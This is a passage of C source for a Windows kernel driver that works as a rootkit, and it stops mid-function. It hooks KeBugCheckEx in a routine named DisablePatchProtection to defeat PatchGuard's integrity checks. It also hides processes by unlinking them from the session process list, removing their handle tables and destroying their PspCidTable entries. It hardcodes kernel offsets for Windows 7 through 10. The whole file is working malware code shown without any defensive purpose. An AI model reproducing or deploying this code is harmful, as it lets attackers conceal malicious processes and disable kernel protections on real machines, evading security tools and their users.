#include "HandleHide.h"

//LIST_ENTRY g_ActiveProcessEntry;
//LIST_ENTRY g_SessionProcess;

extern DWORD64 g_offset;
DWORD64 g_offset_Thread = 0;

#ifdef DEBUG
#define LOG_DEBUG(format,...) DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL,"[%d]" format,__LINE__, __VA_ARGS__);
#else
#define LOG_DEBUG(format,...) //DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, format, __VA_ARGS__)
#endif



extern RTL_OSVERSIONINFOEXW OsVersion;

extern PLIST_ENTRY PsActiveProcessHead;
PLIST_ENTRY KiProcessListHead = 0;


KSPIN_LOCK SpinLock_RecoveryThread;
KSPIN_LOCK SpinLock_RmoveThread_Now;
KSPIN_LOCK SpinLock_RmoveThread;

DWORD offsetCLIENT_ID = 0;
DWORD OffsetApcState = 0;
DWORD offsetProcess = 0;

//Cid + 0x70
DWORD offsetEthread_ThreadList = 0;
DWORD offsetEprocess_ThreadList = 0;
DWORD offsetKprocess_ProcessList = 0;


void wRbuildProcessList();
void wRbuildThreadList(PEPROCESS EPROCESS, HANDLE hID, BOOLEAN bHIDE);



#define  OFFSET_KPROCESS_THREADLIST  0x30
#define  OFFSER_KTHREAD_THREADLIST 0x2F8

//
// Both of these routines reference the assembly code described
// above
//
extern VOID OrigKeBugCheckEx(
	IN ULONG BugCheckCode,
	IN ULONG_PTR BugCheckParameter1,
	IN ULONG_PTR BugCheckParameter2,
	IN ULONG_PTR BugCheckParameter3,
	IN ULONG_PTR BugCheckParameter4);
extern VOID AdjustStackCallPointer(
	IN ULONG_PTR NewStackPointer,
	IN PVOID StartAddress,
	IN PVOID Argument);
//
// mov eax, ptr
// jmp eax
//
static CHAR HookStub[] =
"\x48\xb8\x41\x41\x41\x41\x41\x41\x41\x41\xff\xe0";

//
// The offset into the ETHREAD structure that holds the start routine.
//
static ULONG ThreadStartRoutineOffset = 0;

static ULONG ValCanParm = 0;
//
// The pointer into KeBugCheckEx after what has been overwritten by the hook.
//
PVOID OrigKeBugCheckExRestorePointer;

typedef VOID(NTAPI* fKeBugCheckEx)(IN ULONG BugCheckCode,
	IN ULONG_PTR BugCheckParameter1,
	IN ULONG_PTR BugCheckParameter2,
	IN ULONG_PTR BugCheckParameter3,
	IN ULONG_PTR BugCheckParameter4);

fKeBugCheckEx TrueOrigKeBugCheckEx = 0;


VOID KeBugCheckExHook(
	IN ULONG BugCheckCode,
	IN ULONG_PTR BugCheckParameter1,
	IN ULONG_PTR BugCheckParameter2,
	IN ULONG_PTR BugCheckParameter3,
	IN ULONG_PTR BugCheckParameter4)
{
	//PUCHAR LockedAddress;
	//PCHAR ReturnAddress;
	//PMDL Mdl = NULL;
	//
	// Call the real KeBugCheckEx if this isn’t the bug check code we’re looking
	// for.
	//
	if (!(BugCheckCode == 0x139 || BugCheckCode == 0x109))
	{
		//DebugPrint(("Passing through bug check %.4x to %p.",BugCheckCode,OrigKeBugCheckEx));
		TrueOrigKeBugCheckEx(
			BugCheckCode,
			BugCheckParameter1,
			BugCheckParameter2,
			BugCheckParameter3,
			BugCheckParameter4);
	}
	else
	{
		PCHAR CurrentThread = (PCHAR)PsGetCurrentThread();
		PVOID StartRoutine = *(PVOID**)(CurrentThread + ThreadStartRoutineOffset);
		PVOID StackPointer = IoGetInitialStack();
		LOG_DEBUG("Restarting the current worker thread %p at %p (SP=%p, off=%lu).\n",
			PsGetCurrentThread(),
			StartRoutine,
			StackPointer,
			ThreadStartRoutineOffset);

		//PsTerminateSystemThread(0);
		//
		// Shift the stack pointer back to its initial value and call the routine. We
		// subtract eight to ensure that the stack is aligned properly as thread
		// entry point routines would expect.
		//


	//	KEVENT Notify;
	//	KeInitializeEvent(&Notify, SynchronizationEvent, FALSE);
		//
		//ExInitializeWorkItem(&gWorkInfo.Worker, HideHandleWorker, &gWorkInfo);

		//ExQueueWorkItem(&gWorkInfo.Worker, CriticalWorkQueue);

		//KeWaitForSingleObject(
		//	&Notify,
		//	Executive,
		//	KernelMode,
		//	FALSE,
		//	NULL);



		//if (PsGetCurrentProcessId() == 4)
		//{

		//}
		//else
		//{
		//	return;
		//}



		//KeWaitForSingleObject()
		////KIRQL Irql;
		////KeRaiseIrql(PASSIVE_LEVEL, &Irql)

	GAPOW:
		__try {
			//__writecr8(PASSIVE_LEVEL);
			AdjustStackCallPointer(
				(ULONG_PTR)StackPointer,
				StartRoutine,
				NULL);
		}
		__except (1) {
			goto GAPOW;
		}


	}
	//
	// In either case, we should never get here.
	//
	 __debugbreak();
}

extern BOOLEAN  SSDT_HOOK_NOW(PVOID pNewFun, PVOID pOldFun, PVOID CALLFUN);

extern BOOLEAN  SSDT_HOOK_SHOW_NOW(PVOID pNewFun, PVOID pOldFun, PVOID CALLFUN);



void RemoveThreadSingle(HANDLE hProcess, HANDLE hThread);


VOID DisablePatchProtectionSystemThreadRoutine(
	IN PVOID Nothing)
{

	NTSTATUS Status = STATUS_SUCCESS;
	PUCHAR LockedAddress;
	PUCHAR CurrentThread = (PUCHAR)PsGetCurrentThread();

	PMDL Mdl = NULL;

	do
	{
		//
		// Find the thread’s start routine offset.
		//

		LOG_DEBUG("While\n");
		for (ThreadStartRoutineOffset = 0;
			ThreadStartRoutineOffset < 0x1000;
			ThreadStartRoutineOffset += 4)
		{
			if (*(PVOID**)(CurrentThread +
				ThreadStartRoutineOffset) == (PVOID)DisablePatchProtectionSystemThreadRoutine)
				break;
		}
		LOG_DEBUG("Thread start routine offset is 0x%.4x.\n",ThreadStartRoutineOffset);
	} while (0);

}



//
// A pointer to KeBugCheckExHook
//
PVOID KeBugCheckExHookPointer = KeBugCheckExHook;
NTSTATUS DisablePatchProtection() {
	OBJECT_ATTRIBUTES Attributes;
	NTSTATUS Status;
	HANDLE ThreadHandle = NULL;
	InitializeObjectAttributes(
		&Attributes,
		NULL,
		OBJ_KERNEL_HANDLE,
		NULL,
		NULL);
	
	 //Create the system worker thread so that we can automatically find the
	 //offset inside the ETHREAD structure to the thread’s start routine.
	

	if (TrueOrigKeBugCheckEx != 0)
	{
		return 0;
	}


	Status = PsCreateSystemThread(
		&ThreadHandle,
		THREAD_ALL_ACCESS,
		&Attributes,
		NULL,
		NULL,
		DisablePatchProtectionSystemThreadRoutine,
		(PVOID)0x123456789);

	if (ThreadHandle)
		ZwClose(ThreadHandle);

	//PsCreateSystemThreadEx


	UNICODE_STRING SymbolName;
	RtlInitUnicodeString(
		&SymbolName,
		L"KeBugCheckEx");
	PVOID KeBugCheckExSymbol = MmGetSystemRoutineAddress(&SymbolName);
	if (KeBugCheckExSymbol == NULL)
	{
		LOG_DEBUG("KeBugCheckExSymbol <%p>\n", KeBugCheckExSymbol);
		return Status;
	}


	if (OsVersion.dwBuildNumber >= 9600)
	{
		SSDT_HOOK_NOW(&KeBugCheckExHook, KeBugCheckExSymbol, &TrueOrigKeBugCheckEx);
	}
	//DisablePatchProtectionSystemThreadRoutine(0);
	return Status;
}
















typedef struct _FUNCTION_KENERL
{
	PVOID /* 29*/ ExAcquireResourceSharedLite;
	PVOID /* 30*/ ExAcquireResourceExclusiveLite;
	PVOID /* 31*/ ExAllocatePoolWithTag;
	PVOID /* 32*/ ExFreePoolWithTag;
	PVOID /* 33*/ ExMapHandleToPointer;
	PVOID /* 34*/ ExQueueWorkItem;
	PVOID /* 35*/ ExReleaseResourceLite;
	PVOID /* 36*/ ExUnlockHandleTableEntry;
	PVOID /* 37*/ ExAcquirePushLockExclusiveEx;
	PVOID /* 38*/ ExReleasePushLockExclusiveEx;
	PVOID /* 39*/ ExAcquirePushLockSharedEx;
	PVOID /* 40*/ ExReleasePushLockSharedEx;
	PVOID /* 41*/ KeAcquireInStackQueuedSpinLockAtDpcLevel;
	PVOID /* 42*/ ExAcquireSpinLockSharedAtDpcLevel;
	PVOID /* 43*/ KeBugCheckEx;
	PVOID /* 44*/ KeDelayExecutionThread;
	PVOID /* 45*/ KeEnterCriticalRegionThread;
	PVOID /* 46*/ KeLeaveCriticalRegion;
	PVOID /* 47*/ KeEnterGuardedRegion;
	PVOID /* 48*/ KeLeaveGuardedRegion;
	PVOID /* 49*/ KeReleaseInStackQueuedSpinLockFromDpcLevel;
	PVOID /* 50*/ ExReleaseSpinLockSharedFromDpcLevel;
	PVOID /* 51*/ KeRevertToUserGroupAffinityThread;
	PVOID /* 52*/ KeProcessorGroupAffinity;
	PVOID /* 53*/ KeInitializeEnumerationContext;
	PVOID /* 54*/ KeEnumerateNextProcessor;
	PVOID /* 55*/ KeCountSetBitsAffinityEx;
	PVOID /* 56*/ KeQueryAffinityProcess;
	PVOID /* 57*/ KeQueryAffinityThread;
	PVOID /* 58*/ KeSetSystemGroupAffinityThread;
	PVOID /* 59*/ KeSetCoalescableTimer;//59
	PVOID /* 60*/ ObfDereferenceObject;
	PVOID /* 61*/ ObReferenceObjectByName;
	PVOID /* 62*/ RtlImageDirectoryEntryToData;
	PVOID /* 63*/ RtlImageNtHeader; //63
	PVOID /* 64*/ RtlLookupFunctionTable;
	PVOID /* 65*/ RtlPcToFileHeader;
	PVOID /* 66*/ RtlSectionTableFromVirtualAddress;
	PVOID /* 67*/ DbgPrint;
	PVOID /* 68*/ MmAllocateIndependentPages;
	PVOID /* 69*/ MmFreeIndependentPages;
	// 70
	PVOID /* 70*/ MmSetPageProtection;
	// 76
	PVOID /* 76*/ RtlLookupFunctionEntry;
	PVOID /* 77*/ KeAcquireSpinLockRaiseToDpc;
	PVOID /* 78*/ KeReleaseSpinLock;
	PVOID /* 79*/ MmGetSessionById;
	PVOID /* 80*/ MmGetNextSession;
	PVOID /* 81*/ MmQuitNextSession;
	PVOID /* 82*/ MmAttachSession;
	PVOID /* 83*/ MmDetachSession;
	PVOID /* 84*/ MmGetSessionIdEx;
	PVOID /* 85*/ MmIsSessionAddress;
	PVOID /* 86*/ MmIsAddressValid;
	PVOID /* 87*/ MmSessionGetWin32Callouts;
	PVOID /* 88*/ KeInsertQueueApc;
	PVOID /* 90*/* UNKONW; //(_QWORD*)(v326 + 8);
	PVOID /* 89*/ KeWaitForSingleObject;
	PVOID /* 91*/ ExReferenceCallBackBlock;
	PVOID /* 92*/ ExGetCallBackBlockRoutine;
	PVOID /* 93*/ ExDereferenceCallBackBlock;
	PVOID /* 94*/ sub_1401A5770;
	PVOID /* 95*/ PspEnumerateCallback;
	PVOID /* 96*/ CmpEnumerateCallback;
	PVOID /* 97*/ DbgEnumerateCallback;
	PVOID /* 98*/ ExpEnumerateCallback;
	PVOID /* 99*/ ExpGetNextCallback;
	PVOID /* 100*/ xHalTimerWatchdogStop;
	PVOID /* 101*/ KiSchedulerApcTerminate;
	PVOID /* 102*/ KiSchedulerApc;
	//PVOID /* 103*/ xHalTimerWatchdogStop;
	PVOID /* 104*/ sub_1401A6870;
	PVOID /* 105*/ MmAllocatePagesForMdlEx;
	PVOID /* 106*/ MmAllocateMappingAddress;
	PVOID /* 107*/ MmMapLockedPagesWithReservedMapping;
	PVOID /* 108*/ MmUnmapReservedMapping;
	PVOID /* 109*/ sub_1401B2BA0;
	PVOID /* 110*/ sub_1401B2C10;
	PVOID /* 111*/ MmAcquireLoadLock;
	PVOID /* 112*/ MmReleaseLoadLock;
	PVOID /* 113*/ KeEnumerateQueueApc;
	PVOID /* 114*/ KeIsApcRunningThread;
	PVOID /* 115*/ sub_1401A6740;
	//v326 = v4474;
	PVOID /* 116*/ PsAcquireProcessExitSynchronization;
	PVOID /* 117*/ ObDereferenceProcessHandleTable;
	PVOID /* 118*/ PsGetNextProcess;
	PVOID /* 119*/ PsQuitNextProcessThread;
	PVOID /* 120*/ PsGetNextProcessEx;
	PVOID /* 121*/ MmIsSessionLeaderProcess;
	PVOID /* 122*/ PsInvokeWin32Callout;
	PVOID /* 123*/ MmEnumerateAddressSpaceAndReferenceImages;
	PVOID /* 124*/ PsGetProcessProtection;
	PVOID /* 125*/ PsGetProcessSignatureLevel;
	PVOID /* 126*/ PsGetProcessSectionBaseAddress;
	PVOID /* 127*/ SeCompareSigningLevels;
	PVOID /* 133*/ RtlIsMultiSessionSku;
	PVOID /* 134*/ KiEnumerateCallback;
	PVOID /* 135*/ KeStackAttachProcess;
	PVOID /* 136*/ KeUnstackDetachProcess;
	PVOID /* 137*/ KeIpiGenericCall;
	PVOID /* 138*/ sub_1401B29F0;
	PVOID /* 139*/ MmGetPhysicalAddress;
	PVOID /* 140*/ MmUnlockPages;
	PVOID /* 128*/ KeComputeSha256;
	PVOID /* 129*/ KeComputeParallelSha256;
	PVOID /* 130*/ KeSetEvent;
	PVOID /* 141*/ VslVerifyPage;
	PVOID /* 144*/ PsLookupProcessByProcessId;
	PVOID /* 145*/ PsGetProcessId;
	PVOID /* 146*/ MmCheckProcessShadow;
	PVOID /* 147*/ MmGetImageRetpolineCodePage;
	PVOID /* 300*/ qword_1404289C0;

	PVOID /* 131*/ RtlpConvertFunctionEntry;
	PVOID /* 132*/ RtlpLookupPrimaryFunctionEntry; //132
	PVOID /* 142*/ KiGetInterruptObjectAddress;// 142

}FUNCTION_KENERL,* PFUNCTION_KENERL;


//------------------------------------------------------------------------



RTL_AVL_TABLE  TableAvl_0; //Process
RTL_AVL_TABLE  TableAvl_1; //Thread
//RTL_AVL_TABLE  TableAvl_Mutex;


_Function_class_(RTL_AVL_COMPARE_ROUTINE)
RTL_GENERIC_COMPARE_RESULTS CompareHandleTableEntry(struct _RTL_AVL_TABLE* Table, PVOID  FirstStruct, PVOID  SecondStruct)
{
	TABLE_HANDLE_INFO *first = (PTABLE_HANDLE_INFO)FirstStruct;
	TABLE_HANDLE_INFO *second = (PTABLE_HANDLE_INFO)SecondStruct;

	UNREFERENCED_PARAMETER(Table);
	if (first->hID > second->hID)
		return GenericGreaterThan;
	if (first->hID < second->hID)
		return GenericLessThan;
	return GenericEqual;
}

_Function_class_(RTL_AVL_ALLOCATE_ROUTINE)
PVOID AllocateHandleTableEntry(struct _RTL_AVL_TABLE* Table, CLONG  ByteSize)
{
	UNREFERENCED_PARAMETER(Table);
	return ExAllocatePoolWithTag(NonPagedPool, ByteSize, 'tag');
}

_Function_class_(RTL_AVL_FREE_ROUTINE)
VOID FreeHandleTableEntry(struct _RTL_AVL_TABLE* Table, PVOID  Buffer)
{
	UNREFERENCED_PARAMETER(Table);
	ExFreePoolWithTag(Buffer, 'tag');
}












































//----------------------------------------------------------------------//


FUNCTION_KENERL fKernel;
PVOID g_KernelBase = NULL;
DYNAMIC_DATA	 g_dynData;

//SessionProcesslist Method - Unlink target process from session process list
NTSTATUS SessionProcessListHiding(PEPROCESS pep, BOOLEAN bHiding)
{

	

	if (!g_dynData.SessionProcessLinks)
		return STATUS_NOT_SUPPORTED;

	__try
	{
		//TODO: Add Rundown Protection, Critical Section/Region
		LIST_ENTRY *pLE = (LIST_ENTRY *)MAKEPTR(pep, g_dynData.SessionProcessLinks);

		if (bHiding)
		{
			pLE->Flink->Blink = pLE->Blink;
			pLE->Blink->Flink = pLE->Flink;

			//Avoid BSOD on process Rundown
			pLE->Flink = pLE;
			pLE->Blink = pLE;
		}
		else
		{
			//NULL
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return STATUS_ACCESS_DENIED;
	}

	return STATUS_SUCCESS;
}

//ProcessHandleTable Method - Remove handle table of target process
NTSTATUS RemoveProcessHandleTable(PEPROCESS pep)
{
	InitDynamicData(&g_dynData);

	if (!g_dynData.ObjTable || !g_dynData.correctBuild || !g_dynData.ExRemoveHandleTable)
		return STATUS_NOT_SUPPORTED;

	__try
	{
		void *pHandleTable = *((void **)MAKEPTR(pep, g_dynData.ObjTable));
		fnExRemoveHandleTable ExRemoveHandleTable = (fnExRemoveHandleTable)((ULONG_PTR)GetKernelBase2() + g_dynData.ExRemoveHandleTable);
		ExRemoveHandleTable(pHandleTable);
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{

		return STATUS_ACCESS_DENIED;
	}

	return STATUS_SUCCESS;
}

//PspCidTable Method - Destroy handle for target process and threads of that process
NTSTATUS RemovePspCidTable(PEPROCESS pep, HANDLE pid)
{
	LIST_ENTRY *ThreadListHead;
	LIST_ENTRY *pLE;
	fnExExDestroyHandle ExDestroyHandle;

	if (!g_dynData.UniqueProcessId || !g_dynData.ThreadListHead || !g_dynData.ThreadListEntry || !g_dynData.UniqueProcess || !g_dynData.UniqueThread ||
		!g_dynData.correctBuild || !g_dynData.PspCidTable || !g_dynData.ExDestroyHandle)
		return STATUS_NOT_SUPPORTED;
	
    __try
    {
        void *PspCidTable = *((void **)MAKEPTR(GetKernelBase2(), g_dynData.PspCidTable));
		
		ExDestroyHandle = (fnExExDestroyHandle)((ULONG_PTR)GetKernelBase2() + g_dynData.ExDestroyHandle);
        if (!ExDestroyHandle(PspCidTable, pid, NULL))
        {
            return STATUS_ACCESS_DENIED;
        }
		
        *((ULONG64 *)MAKEPTR(pep, g_dynData.UniqueProcessId)) = 0;  //Avoid CID_HANDLE_DELETION BSOD)
 
		ThreadListHead = (LIST_ENTRY *)MAKEPTR(pep, g_dynData.ThreadListHead);
		pLE = ThreadListHead;
 
        while ((pLE = pLE->Flink) != ThreadListHead)
        {
            PETHREAD pet = (PETHREAD)MAKEPTR(pLE, ~((DWORD_PTR)(g_dynData.ThreadListEntry + 0x8)) + 1);
            HANDLE tid = PsGetThreadId(pet);
            HANDLE tpid = PsGetThreadProcessId(pet);
 
            if (pid == tpid) //Self-Check
            {
                if (!ExDestroyHandle(PspCidTable, tid, NULL))
                {
                    return STATUS_ACCESS_DENIED;
                }
 
                *((ULONG64 *)MAKEPTR(pet, g_dynData.UniqueThread)) = 0;
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return STATUS_ACCESS_DENIED;
    }
 
    return STATUS_SUCCESS;
}

//Obtain base address of NT Module (ntoskrnl.exe) in memory, this is used with some offsets to calculate the address of some undocumented stuff
PVOID GetKernelBase2()
{
	NTSTATUS status = STATUS_SUCCESS;
	ULONG bytes = 0;
	PRTL_PROCESS_MODULES pMods = NULL;
	PVOID checkPtr = NULL;
	UNICODE_STRING routineName;

	//Already found
	if (g_KernelBase != NULL)
		return g_KernelBase;

	RtlInitUnicodeString( &routineName, L"NtOpenFile" );

	checkPtr = MmGetSystemRoutineAddress( &routineName );
	if (checkPtr == NULL)
		return NULL;



	//ZwQueryInformationThread


	//Protect from UserMode AV
	__try
	{
		status = ZwQuerySystemInformation( 0xb, 0, bytes, &bytes );
		if (bytes == 0)
		{
			return NULL;
		}

		pMods = (PRTL_PROCESS_MODULES)ExAllocatePoolWithTag( NonPagedPool, bytes,'tag');
		RtlZeroMemory( pMods, bytes );

		status = ZwQuerySystemInformation(0xb, pMods, bytes, &bytes );

		if (NT_SUCCESS( status ))
		{
			PRTL_PROCESS_MODULE_INFORMATION pMod = pMods->Modules;

			ULONG i;
			for (i = 0; i < pMods->NumberOfModules; i++)
			{
				if (checkPtr >= pMod[i].ImageBase &&
					checkPtr < (PVOID)((PUCHAR)pMod[i].ImageBase + pMod[i].ImageSize))
				{
					g_KernelBase = pMod[i].ImageBase;
					break;
				}
			}
		}

	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
	}

	if (pMods)
		ExFreePoolWithTag( pMods,'tag');
	return g_KernelBase;
}

BOOLEAN Is64BitWindows()
{
	#if defined(_X86_)
		return FALSE;
	#else
		return TRUE;
	#endif
}

//Get the revision number from registry 
//"\\Registry\\Machine\\Software\\Microsoft\\Windows NT\\CurrentVersion"
//Data of value "BuildLabEx" Ex: "9600.17736.amd64fre.winblue_r9.150322-1500"
//9600 is build number, 17736 is revision number
// 
// 
NTSTATUS GetRevisionBuildNO( OUT PULONG pRevisionBuildNo )
{
	NTSTATUS status = STATUS_SUCCESS;
	UNICODE_STRING strRegKey = { 0 };
	UNICODE_STRING strRegValue = { 0 };
	UNICODE_STRING strVerVal = { 0 };
	HANDLE hKey = NULL;
	OBJECT_ATTRIBUTES keyAttr = { 0 };
	PKEY_VALUE_FULL_INFORMATION pValueInfo;
	ULONG bytes;
	ULONG i;
	ULONG j;
	PWCHAR pData;

	if (pRevisionBuildNo == 0)
		return STATUS_INVALID_PARAMETER;

	RtlInitUnicodeString( &strRegKey, L"\\Registry\\Machine\\Software\\Microsoft\\Windows NT\\CurrentVersion" );
	RtlInitUnicodeString( &strRegValue, L"BuildLabEx" );

	InitializeObjectAttributes( &keyAttr, &strRegKey, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL );

	status = ZwOpenKey( &hKey, KEY_READ, &keyAttr );
	if (NT_SUCCESS( status ))
	{
		pValueInfo = ExAllocatePoolWithTag( PagedPool, 0x1000,'tag');
		bytes = 0;

		if (pValueInfo)
		{
			status = ZwQueryValueKey( hKey, &strRegValue, KeyValueFullInformation, pValueInfo, 0x1000, &bytes );
			if (NT_SUCCESS( status ))
			{
				pData = (PWCHAR)((PUCHAR)pValueInfo->Name + pValueInfo->NameLength);
				for (i = 0; i < pValueInfo->DataLength; i++)
				{
					if (pData[i] == L'.')
					{
						for (j = i + 1; j < pValueInfo->DataLength; j++)
						{
							if (pData[j] == L'.')
							{
								strVerVal.Buffer = &pData[i] + 1;
								strVerVal.Length = strVerVal.MaximumLength = (USHORT)((j - i) * sizeof( WCHAR ));
								status = RtlUnicodeStringToInteger( &strVerVal, 10, pRevisionBuildNo );

								goto skip1;
							}
						}
					}
				}

skip1:;
			}

			ExFreePoolWithTag(pValueInfo,'tag');
		}
		else
			status = STATUS_NO_MEMORY;

		ZwClose( hKey );
	}

	return status;

}

//We init dynamic data structure containing OS version and some fixed offsets used for our hiding methods

//+ PsActiveProcessList using:
//_EPROCESS->ActiveProcessLinks

//+ SessionProcessList using:
//_EPROCESS->SessionProcessLinks

//+ process's handle table removal using:
//ExRemoveHandleTable()
//_EPROCESS->ObjectTable
//+ PspCidTable using:
//_EPROCESS->ThreadListHead
//_ETHREAD->ThreadListEntry
//_ETHREAD->Cid.UniqueThread
//ExDestroyHandle()
//PspCidTable()

//NOTICE: PsActiveProcesSList & SessionProcessList methods can be used dependant on build number of OS
//NOTICE: Process's handle table removal and PspCidTable can be used dependant on build number and revision of OS
//////////////////////////////////////////////////////////////////////////
NTSTATUS InitDynamicData( IN OUT PDYNAMIC_DATA pData )
{
	NTSTATUS status = STATUS_SUCCESS;
	RTL_OSVERSIONINFOEXW verInfo = { 0 };
	ULONG revisionBuildNo = 0;
	BOOLEAN bX64 = FALSE;
	ULONG ver_short;
	CHAR output[256] = { 0 };

	if (pData == NULL)
		return STATUS_INVALID_ADDRESS;

	RtlZeroMemory( pData, sizeof( DYNAMIC_DATA ) );

	bX64 = Is64BitWindows();

	//Get the build number of OS
	verInfo.dwOSVersionInfoSize = sizeof( verInfo );
	status = RtlGetVersion( (PRTL_OSVERSIONINFOW)&verInfo );

	if (status == STATUS_SUCCESS)
	{
		ver_short = (verInfo.dwMajorVersion << 8) | (verInfo.dwMinorVersion << 4) | verInfo.wServicePackMajor;
		pData->ver = (WinVer)ver_short;

		//Get the revision number of OS
		status = GetRevisionBuildNO( &revisionBuildNo );

		//Check current revision number with our known number
		pData->correctBuild = TRUE;

		if (ver_short == WINVER_7)
		{
			if(revisionBuildNo != 16385)
				pData->correctBuild = FALSE;
		}
		else if (ver_short == WINVER_7_SP1)
		{
			if(revisionBuildNo != 17514)
				pData->correctBuild = FALSE;
		}
		else if (ver_short == WINVER_8)
		{
			if(revisionBuildNo != 16384 && revisionBuildNo != 17438)
				pData->correctBuild = FALSE;
		}
		else if (ver_short == WINVER_81)
		{
			if(revisionBuildNo != 16404)
				pData->correctBuild = FALSE;
		}
		else if (ver_short == WINVER_10)
		{
			if(revisionBuildNo != 16431 && revisionBuildNo != 16412)
				pData->correctBuild = FALSE;
		}
		else
			return STATUS_NOT_SUPPORTED;

		switch (ver_short)
		{
			//Windows 7
			//Windows 7 SP1
		case WINVER_7:
		case WINVER_7_SP1:
			pData->ActiveProcessLinks	= (bX64) ? 0x188 : 0xB8;
			pData->SessionProcessLinks	= (bX64) ? 0x1E0 : 0xE4;
			pData->ObjTable				= (bX64) ? 0x200 : 0xF4;
			pData->UniqueProcessId		= (bX64) ? 0x180 : 0xB4;
			pData->ThreadListHead		= (bX64) ? 0x308 : 0x188;
			pData->ThreadListEntry		= (bX64) ? 0x420 : 0x268;
			pData->UniqueProcess		= (bX64) ? 0x3B0 + 0x0 : 0x22C + 0x0;
			pData->UniqueThread			= (bX64) ? 0x3B0 + 0x8 : 0x22C + 0x4;

			if (revisionBuildNo == 16385 || revisionBuildNo == 17514)
			{
				if (bX64)
				{
					pData->ExDestroyHandle = (ver_short == WINVER_7_SP1) ? 0 : 0x384DB0;
					pData->ExRemoveHandleTable = (ver_short == WINVER_7_SP1) ? 0x32A870 : 0x32D404;
					pData->PspCidTable = (ver_short == WINVER_7_SP1) ? 0 : 0x21FB68;
				}
				else
				{
					pData->ExDestroyHandle = (ver_short == WINVER_7_SP1) ? 0x21365F : 0;
					pData->ExRemoveHandleTable = (ver_short == WINVER_7_SP1) ? 0x266C1F : 0;
					pData->PspCidTable = (ver_short == WINVER_7_SP1) ? 0x1396F4 : 0;
				}
			}
			break;

			//Windows 8.0
		case WINVER_8:
			pData->ActiveProcessLinks	= (bX64) ? 0x2E8 : 0xB8;
			pData->SessionProcessLinks	= (bX64) ? 0x330 : 0xE0;
			pData->ObjTable				= (bX64) ? 0x408 : 0x150;
			pData->UniqueProcessId		= (bX64) ? 0x2E0 : 0xB4;
			pData->ThreadListHead		= (bX64) ? 0x470 : 0x194;
			pData->ThreadListEntry		= (bX64) ? 0x400 : 0x24C;
			pData->UniqueProcess		= (bX64) ? 0x398 + 0x0 : 0x214 + 0x0;
			pData->UniqueThread			= (bX64) ? 0x398 + 0x8 : 0x214 + 0x4;

			if (revisionBuildNo == 16384)
			{
				pData->ExDestroyHandle = (bX64) ? 0x47969C : 0x24B38A;
				pData->ExRemoveHandleTable = (bX64) ? 0x424440 : 0x2C5065;
				pData->PspCidTable = (bX64) ? 0x356188 : 0x215074;
			}
			if (revisionBuildNo == 17438)
			{
				pData->ExDestroyHandle = (bX64) ? 0x494D20 : 0;
				pData->ExRemoveHandleTable = (bX64) ? 0x4863F0 : 0;
				pData->PspCidTable = (bX64) ? 0x358188 : 0;
			}
			break;

			//Windows 8.1
		case WINVER_81:
			pData->ActiveProcessLinks	= (bX64) ? 0x2E8 : 0;
			pData->SessionProcessLinks	= (bX64) ? 0x330 : 0;
			pData->ObjTable				= (bX64) ? 0x408 : 0;
			pData->UniqueProcessId		= (bX64) ? 0x2E0 : 0;
			pData->ThreadListHead		= (bX64) ? 0x470 : 0;
			pData->ThreadListEntry		= (bX64) ? 0x688 : 0;
			pData->UniqueProcess		= (bX64) ? 0x620 + 0x0 : 0;
			pData->UniqueThread			= (bX64) ? 0x620 + 0x8 : 0;

			if (revisionBuildNo == 16404)
			{
				pData->ExDestroyHandle = (bX64) ? 0x3D06E0 : 0;
				pData->ExRemoveHandleTable = (bX64) ? 0x40F180 : 0;
				pData->PspCidTable = (bX64) ? 0x34D200 : 0;
			}
			break;

			//Windows 10
		case WINVER_10:
			pData->ActiveProcessLinks	= (bX64) ? 0x2F0 : 0;
			pData->SessionProcessLinks	= (bX64) ? 0x340 : 0;
			pData->ObjTable				= (bX64) ? 0x418 : 0;
			pData->UniqueProcessId		= (bX64) ? 0x2E8 : 0;
			pData->ThreadListHead		= (bX64) ? 0x480 : 0;
			pData->ThreadListEntry		= (bX64) ? 0x690 : 0;
			pData->UniqueProcess		= (bX64) ? 0x628 + 0x0 : 0;
			pData->UniqueThread			= (bX64) ? 0x628 + 0x8 : 0;

			if (revisionBuildNo == 16431 || revisionBuildNo == 16412)
			{
				pData->ExDestroyHandle = (bX64) ? 0x4BD5E8 : 0;
				pData->ExRemoveHandleTable = (bX64) ? 0x4C36AC : 0;
				pData->PspCidTable = (bX64) ? 0x3C5318 : 0;
			}
			break;

		default:
			break;
		}
	}

	return status;
}





// 获取 PspCidTable
BOOLEAN get_PspCidTable(ULONG64* tableAddr) {

	// 获取 PsLookupProcessByProcessId 地址
	UNICODE_STRING uc_funcName;
	RtlInitUnicodeString(&uc_funcName, L"PsLookupProcessByProcessId");
	ULONG64 ul_funcAddr = (ULONG64)MmGetSystemRoutineAddress(&uc_funcName);
	if (ul_funcAddr == 0) {
		//DbgPrint("[LYSM] MmGetSystemRoutineAddress error.\n");
		LOG_DEBUG("[LYSM] MmGetSystemRoutineAddress error  PsLookupProcessByProcessId\n");
		return FALSE;
	}
	//DbgPrint("[LYSM] PsLookupProcessByProcessId:%p\n", ul_funcAddr);

	// 前 40 字节有 call（PspReferenceCidTableEntry）
	ULONG64 ul_entry = 0;
	for (INT i = 0; i < 40; i++) {
		if (*(PUCHAR)(ul_funcAddr + i) == 0xe8) {
			ul_entry = ul_funcAddr + i;
			break;
		}
	}
	if (ul_entry != 0) {
		// 解析 call 地址
		INT i_callCode = *(INT*)(ul_entry + 1);
		//DbgPrint("[LYSM] i_callCode:%X\n", i_callCode);
		ULONG64 ul_callJmp = ul_entry + i_callCode + 5;
		//DbgPrint("[LYSM] ul_callJmp:%p\n", ul_callJmp);
		// 来到 call（PspReferenceCidTableEntry） 内找 PspCidTable
		for (INT i = 0; i < 0x30; i++) {
			if (*(PUCHAR)(ul_callJmp + i) == 0x48 &&
				*(PUCHAR)(ul_callJmp + i + 1) == 0x8b &&
				*(PUCHAR)(ul_callJmp + i + 2) == 0x05) {
				// 解析 mov 地址
				INT i_movCode = *(INT*)(ul_callJmp + i + 3);
				//DbgPrint("[LYSM] i_movCode:%X\n", i_movCode);
